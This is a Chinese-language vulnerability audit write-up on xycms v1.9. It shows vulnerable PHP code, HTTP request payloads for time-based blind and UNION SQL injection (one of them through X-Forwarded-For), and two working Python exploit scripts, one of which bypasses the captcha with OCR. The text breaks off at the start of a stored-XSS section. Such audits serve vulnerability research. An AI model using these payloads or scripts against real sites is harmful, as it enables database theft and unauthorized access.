<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>记一次xycms v1.9的审计，文章有写的不好的地方，大佬们轻喷。</p>
<h1 data-content="1" id="976aaebbbf9b11590409125e3c5daed5">网站目录结构</h1>
<pre><code>├── Conf（连接数据库的一些配置文件）
├── Libs（一些公共函数）
├── Statics（js的一些静态文件）
├── Style（css样式）
├── add_book.php
├── add_do.php
├── code.php
├── foot.php
├── index.php
├── install（网站安装目录）
├── system（网站后台，审计的重点）
└── top.php</code></pre>
<h1 data-content="1" id="3e6e0c0f57e1e3bcc875ba6791eef16b">后台SQL注入漏洞</h1>
<h2 data-content="1" id="6211f7dc6e49349e0d095d1b582d41af">第一处sql注入</h2>
<p><code>/system/add_book_class.php</code>，关键代码如下，这里没有任何的过滤</p>
<div class="highlight"><pre><span></span><span class="x">......</span>
<span class="x">......</span>
<span class="x">......</span>
<span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"act"</span><span class="p">]</span><span class="o">==</span><span class="nx">ok</span><span class="p">){</span>
    <span class="nv">$siteinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'title'</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'title'</span><span class="p">],</span>
        <span class="s1">'c_order'</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'c_order'</span><span class="p">]</span>
        <span class="p">);</span>
    <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span><span class="s2">"****cms_book_class"</span><span class="p">,</span> <span class="nv">$siteinfo</span><span class="p">);</span>
    <span class="c1">//$db-&gt;close();</span>
    <span class="k">echo</span> <span class="s2">"&lt;script language='javascript'&gt;"</span><span class="p">;</span> 
    <span class="k">echo</span> <span class="s2">"alert('恭喜您,信息内容添加成功!');"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">" location='manage_book_class.php';"</span><span class="p">;</span> 
    <span class="k">echo</span> <span class="s2">"&lt;/script&gt;"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>insert函数在<code>/Libs/Class/mysql.class.php</code>，内容如下，这里也并没有对插入数据库的函数进行过滤</p>
<div class="highlight"><pre><span></span><span class="x">function insert($tableName, $column = array()) {</span>
<span class="x">         $columnName = "";</span>
<span class="x">         $columnValue = "";</span>
<span class="x">         foreach ($column as $key =&gt; $value) {</span>
<span class="x">             $columnName .= $key . ",";</span>
<span class="x">             $columnValue .= "'" . $value . "',";</span>
<span class="x">         }</span>
<span class="x">         $columnName = substr($columnName, 0, strlen($columnName) - 1);</span>
<span class="x">         $columnValue = substr($columnValue, 0, strlen($columnValue) - 1);</span>
<span class="x">         $sql = "INSERT INTO $tableName($columnName) VALUES($columnValue)";</span>
<span class="x">         $this-&gt;query($sql);</span>
<span class="x">     }</span>
</pre></div>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/system/add_book_class.php?act=ok</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:81</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">93</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://localhost:81</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://localhost:81/system/add_book_class.php</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=npvaign44srcvlhjglh9srrqo6</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>

title=',case when (ascii(mid((database()),1,1))&lt;127) then (sleep(5)) else (1) end)#&amp;c_order=1
</pre></div>
<p>这里<code>title</code>和<code>c_order</code>参数都存在sql注入</p>
<p>获取数据库名的exp如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">'http://localhost:81/system/add_book_class.php?act=ok'</span>
<span class="c1"># 这里省去了登录的爬虫，因为存在验证码，ocr比较麻烦，所以登录成功后，把cookie替换一下即可</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'Cookie'</span><span class="p">:</span> <span class="s1">'PHPSESSID=npvaign44srcvlhjglh9srrqo6'</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">binary_search_sql</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">length</span><span class="o">=</span><span class="mi">2</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">left</span> <span class="o">=</span> <span class="n">start</span>
        <span class="n">right</span> <span class="o">=</span> <span class="n">end</span>
        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
            <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="n">left</span><span class="p">:</span>
                <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
                <span class="k">break</span>
            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="n">full_payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num1</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">num2</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">mid</span><span class="p">))</span>
            <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">'title'</span><span class="p">:</span><span class="n">full_payload</span><span class="p">,</span><span class="s1">'c_order'</span><span class="p">:</span><span class="s1">'1'</span><span class="p">},</span><span class="n">headers</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">full_payload</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&gt;</span> <span class="mf">2.5</span><span class="p">:</span>
                <span class="n">right</span> <span class="o">=</span> <span class="n">mid</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">left</span> <span class="o">=</span> <span class="n">mid</span>
    <span class="k">return</span> <span class="n">name</span>

<span class="c1"># 这里爆破库名长度</span>
<span class="c1"># 5</span>
<span class="n">database_length_payload</span> <span class="o">=</span> <span class="s2">"',case when (ascii(mid((length(database())),{num1},1))&lt;{num2}) then (sleep(3)) else (1) end)#"</span>
<span class="n">database_length</span> <span class="o">=</span> <span class="n">binary_search_sql</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="n">database_length_payload</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s1">'database_length:'</span><span class="o">+</span><span class="n">database_length</span><span class="p">)</span>

<span class="c1"># 这里爆破库名</span>
<span class="c1">#</span>
<span class="n">database_payload</span> <span class="o">=</span> <span class="s2">"',case when (ascii(mid((database()),{num1},1))&lt;{num2}) then (sleep(3)) else (1) end)#"</span>
<span class="k">print</span><span class="p">(</span><span class="s1">'database_name:'</span><span class="o">+</span><span class="n">binary_search_sql</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="n">database_payload</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">database_length</span><span class="p">)))</span>
</pre></div>
<h2 data-content="1" id="d75dc97171399039c30f528d279d06dc">第二处sql注入</h2>
<p><code>/system/loginpass.php</code>关键代码如下</p>
<div class="highlight"><pre><span></span><span class="x">......</span>
<span class="x">......</span>
<span class="x">......</span>
<span class="x">$login_ip=getIp();</span>
<span class="x">  $sql="select * from admin_user where u_name='".$m_name."' and u_pwd='".$m_pwd."'";</span>
<span class="x">  $result=$db-&gt;query($sql);</span>
<span class="x">if(!mysql_num_rows($result)==0){</span>
<span class="x">    $_SESSION["m_name"] = $m_name;</span>
<span class="x">    $db-&gt;query("UPDATE admin_user SET login_nums=login_nums+1 where u_name='".$m_name."'");</span>
<span class="x">    $login_info=array(</span>
<span class="x">       'u_name'=&gt;$m_name,</span>
<span class="x">       'login_date'=&gt;strtotime(date('Y-m-d')),</span>
<span class="x">       'login_ip'=&gt;$login_ip</span>
<span class="x">    );</span>
<span class="x">    $db-&gt;insert("admin_login_log",$login_info);</span>
<span class="x">    $db-&gt;close();</span>
<span class="x">    ok_info('***cms.php','恭喜您，登陆成功!');</span>
<span class="x">  }</span>
<span class="x">......</span>
<span class="x">......</span>
<span class="x">......</span>
</pre></div>
<p><code>getIp()</code>函数如下</p>
<div class="highlight"><pre><span></span><span class="x">function getIp() {</span>
<span class="x">    if (getenv("HTTP_CLIENT_IP") &amp;&amp; strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))</span>
<span class="x">        $ip = getenv("HTTP_CLIENT_IP");</span>
<span class="x">    else</span>
<span class="x">        if (getenv("HTTP_X_FORWARDED_FOR") &amp;&amp; strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))</span>
<span class="x">            $ip = getenv("HTTP_X_FORWARDED_FOR");</span>
<span class="x">        else</span>
<span class="x">            if (getenv("REMOTE_ADDR") &amp;&amp; strcasecmp(getenv("REMOTE_ADDR"), "unknown"))</span>
<span class="x">                $ip = getenv("REMOTE_ADDR");</span>
<span class="x">            else</span>
<span class="x">                if (isset ($_SERVER['REMOTE_ADDR']) &amp;&amp; $_SERVER['REMOTE_ADDR'] &amp;&amp; strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))</span>
<span class="x">                    $ip = $_SERVER['REMOTE_ADDR'];</span>
<span class="x">                else</span>
<span class="x">                    $ip = "unknown";</span>
<span class="x">    return ($ip);</span>
<span class="x">}</span>
</pre></div>
<p>这里对ip没有做任何的过滤限制，我们可以用http头<code>X-Forwarded-For</code>，对输入的ip进行控制，也就是说，<code>loginpass.php</code>中的变量<code>$login_ip</code>是可控的</p>
<p><code>insert</code>函数如下</p>
<div class="highlight"><pre><span></span><span class="x">function insert($tableName, $column = array()) {</span>
<span class="x">         $columnName = "";</span>
<span class="x">         $columnValue = "";</span>
<span class="x">         foreach ($column as $key =&gt; $value) {</span>
<span class="x">             $columnName .= $key . ",";</span>
<span class="x">             $columnValue .= "'" . $value . "',";</span>
<span class="x">         }</span>
<span class="x">         $columnName = substr($columnName, 0, strlen($columnName) - 1);</span>
<span class="x">         $columnValue = substr($columnValue, 0, strlen($columnValue) - 1);</span>
<span class="x">         $sql = "INSERT INTO $tableName($columnName) VALUES($columnValue)";</span>
<span class="x">         $this-&gt;query($sql);</span>
<span class="x">     }</span>
</pre></div>
<p>这里对插入的数据也没有做任何限制</p>
<p>payload如下</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/system/loginpass.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:81</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">33</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://localhost:81</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://localhost:81/system/index.php</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=npvaign44srcvlhjglh9srrqo6</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">X-Forwarded-For</span><span class="o">:</span> <span class="l">1' and case when (ascii(mid((database()),1,1))&lt;127) then (sleep(5)) else (1) end and '</span>

admin=1&amp;password=1&amp;checkcode=4K23
</pre></div>
<p>也就是说，我们只要能正确识别验证码，<code>X-Forwarded-For</code>中提交盲注的内容，就可以进行sql注入</p>
<p>注入数据库名的<code>exp.py</code></p>
<p>这里必须要安装<code>pytesseract库</code>和<code>tesseract</code>，这样的话ocr识别很快</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span> <span class="nn">pytesseract</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">url_code</span> <span class="o">=</span> <span class="s1">'http://localhost:81/system/code.php?act=yes'</span>
<span class="n">url_login</span> <span class="o">=</span> <span class="s1">'http://localhost:81/system/loginpass.php'</span>
<span class="n">length</span> <span class="o">=</span> <span class="s1">''</span>
<span class="n">name</span> <span class="o">=</span> <span class="s1">''</span>

<span class="c1"># 这里获取验证码，并将原图转为灰度图像，然后再指定二值化的阈值</span>
<span class="k">def</span> <span class="nf">code</span><span class="p">():</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_code</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'1.png'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
    <span class="c1">#新建Image对象</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">"1.png"</span><span class="p">)</span>
    <span class="c1">#进行置灰处理</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s1">'L'</span><span class="p">)</span>
    <span class="c1">#这个是二值化阈值</span>
    <span class="n">threshold</span> <span class="o">=</span> <span class="mi">150</span>
    <span class="n">table</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span>  <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">threshold</span><span class="p">:</span>
            <span class="n">table</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">table</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1">#通过表格转换成二进制图片，1的作用是白色，不然就全部黑色了</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">point</span><span class="p">(</span><span class="n">table</span><span class="p">,</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">code</span>

<span class="c1"># 这里判断数据库名长度验证码是否正确，如果错误的话，递归提交，直到正确为止</span>
<span class="k">def</span> <span class="nf">checkcode_length</span><span class="p">(</span><span class="n">num2</span><span class="p">,</span><span class="n">num1</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">payload_length</span> <span class="o">=</span> <span class="s2">"1' and case when (ascii(mid((length(database())),{num1},1))={num2}) then (sleep(3)) else (1) end and '"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'admin'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
            <span class="s1">'password'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
            <span class="s1">'checkcode'</span><span class="p">:</span> <span class="n">code</span><span class="p">()</span>
            <span class="p">}</span>
    <span class="n">full_payload</span> <span class="o">=</span> <span class="n">payload_length</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num1</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">num1</span><span class="p">),</span><span class="n">num2</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">num2</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">full_payload</span><span class="p">)</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">'X-Forwarded-For'</span><span class="p">:</span> <span class="n">full_payload</span><span class="p">})</span>
    <span class="k">if</span> <span class="s1">'验证码输入有误'</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">checkcode_length</span><span class="p">(</span><span class="n">num2</span><span class="p">)</span>

<span class="c1"># 这里判断数据库名验证码是否正确，如果错误的话，递归提交，直到正确为止</span>
<span class="k">def</span> <span class="nf">checkcode_database_name</span><span class="p">(</span><span class="n">num1</span><span class="p">,</span><span class="n">num2</span><span class="p">):</span>
    <span class="n">payload_database_name</span> <span class="o">=</span> <span class="s2">"1' and case when (ascii(mid((database()),{num1},1))&lt;{num2}) then (sleep(3)) else (1) end and '"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'admin'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
            <span class="s1">'password'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
            <span class="s1">'checkcode'</span><span class="p">:</span> <span class="n">code</span><span class="p">()</span>
            <span class="p">}</span>
    <span class="n">full_payload</span> <span class="o">=</span> <span class="n">payload_database_name</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num1</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">num1</span><span class="p">),</span><span class="n">num2</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">num2</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">full_payload</span><span class="p">)</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">'X-Forwarded-For'</span><span class="p">:</span> <span class="n">full_payload</span><span class="p">})</span>
    <span class="k">if</span> <span class="s1">'验证码输入有误'</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">checkcode_database_name</span><span class="p">(</span><span class="n">num1</span><span class="p">,</span><span class="n">num2</span><span class="p">)</span>

<span class="c1"># 这里返回数据库名的长度</span>
<span class="k">def</span> <span class="nf">database_length</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">length</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span><span class="mi">58</span><span class="p">):</span>
        <span class="n">payload_length</span> <span class="o">=</span> <span class="s2">"1' and case when (ascii(mid((length(database())),1,1))={num1}) then (sleep(3)) else (1) end and '"</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'admin'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
                <span class="s1">'password'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
                <span class="s1">'checkcode'</span><span class="p">:</span> <span class="n">code</span><span class="p">()</span>
                <span class="p">}</span>
        <span class="n">full_payload</span> <span class="o">=</span> <span class="n">payload_length</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num1</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="k">print</span><span class="p">(</span><span class="n">full_payload</span><span class="p">)</span>
        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
        <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">'X-Forwarded-For'</span><span class="p">:</span> <span class="n">full_payload</span><span class="p">})</span>
        <span class="k">if</span> <span class="s1">'验证码输入有误'</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">checkcode_length</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&gt;</span> <span class="mf">2.5</span><span class="p">:</span>
                <span class="n">length</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>

<span class="c1"># 这里调用database_length()函数来获取数据库名的长度</span>
<span class="n">database_length</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>

<span class="c1"># 这里返回数据库名</span>
<span class="k">def</span> <span class="nf">database_name</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">name</span>
    <span class="n">payload_database_name</span> <span class="o">=</span> <span class="s2">"1' and case when (ascii(mid((database()),{num1},1))&lt;{num2}) then (sleep(3)) else (1) end and '"</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">length</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">left</span> <span class="o">=</span> <span class="mi">32</span>
        <span class="n">right</span> <span class="o">=</span> <span class="mi">127</span>
        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
            <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="n">left</span><span class="p">:</span>
                <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
                <span class="k">break</span>

            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'admin'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
                    <span class="s1">'password'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
                    <span class="s1">'checkcode'</span><span class="p">:</span> <span class="n">code</span><span class="p">()</span>
                    <span class="p">}</span>
            <span class="n">full_payload</span> <span class="o">=</span> <span class="n">payload_database_name</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num1</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">num2</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">mid</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="n">full_payload</span><span class="p">)</span>
            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
            <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">'X-Forwarded-For'</span><span class="p">:</span> <span class="n">full_payload</span><span class="p">})</span>
            <span class="k">print</span><span class="p">(</span><span class="n">full_payload</span><span class="p">)</span>

            <span class="k">if</span> <span class="s1">'验证码输入有误'</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
                <span class="n">checkcode_database_name</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&gt;</span> <span class="mf">2.5</span><span class="p">:</span>
                    <span class="n">right</span> <span class="o">=</span> <span class="n">mid</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">left</span> <span class="o">=</span> <span class="n">mid</span>

<span class="c1"># 这里调用database_name()函数来获取数据库名</span>
<span class="n">database_name</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</pre></div>
<h2 data-content="1" id="faadc4a2c1245d0dead1336bb7520e06">第三处sql注入</h2>
<p><code>/system/hf_book.php</code>关键代码如下,大概在这个页面的18行左右</p>
<div class="highlight"><pre><span></span><span class="x">....</span>
<span class="x">....</span>
<span class="x">....</span>
<span class="x">$sxid=$_GET["id"];</span>
<span class="x">$e_rs=$db-&gt;get_one("select * from ***cms_book where id=$sxid",MYSQL_ASSOC);</span>
<span class="x">$bid=$e_rs['id'];</span>
<span class="x">....</span>
<span class="x">....</span>
</pre></div>
<p>先猜测字段数目,11正确，12错误，说明字段数是11</p>
<pre><code>http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 11#</code></pre>
<pre><code>http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 12#</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142259-64ad9136-7961-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142300-652166ec-7961-1.png"/></p>
<p>看回显部分，字段3和字段5存在回显</p>
<pre><code>http://localhost:81/CMS/***cmcs/system/hf_book.php?id=11 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11#</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142302-661ab9d6-7961-1.png"/></p>
<p>注入出数据库名</p>
<pre><code>http://localhost:81/CMS/***cms/system/hf_book.php?id=11 and 1=2 union select 1,2,database(),4,5,6,7,8,9,10,11#</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142302-66a18bdc-7961-1.png"/></p>
<h2 data-content="1" id="ee35aeaea90ea938a9671a434147ad02">小结</h2>
<p>这里其实还有非常多的sql注入，包括insert注入，delete注入，update注入，由于文章篇幅的原因，没有一一例举。因为源头insert或者update或者delete没有做好过滤，导致了这篇漏洞，所以这里也就不再重复说明，举了几个比较典型的案例来说明</p>
<h1 data-content="1" id="25f020406954cf3021240d37d13eae0e">前台存储型xss</h1>
<p><code>/add_do.php</code></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">require</span> <span class="s1">'Conf/***cms.inc.php'</span><span class="p">;</span>
<span class="k">require</span> <span class="s1">'Libs/Function/fun.php'</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"checkcode"</span><span class="p">])</span><span class="o">==</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"randval"</span><span class="p">])){</span>
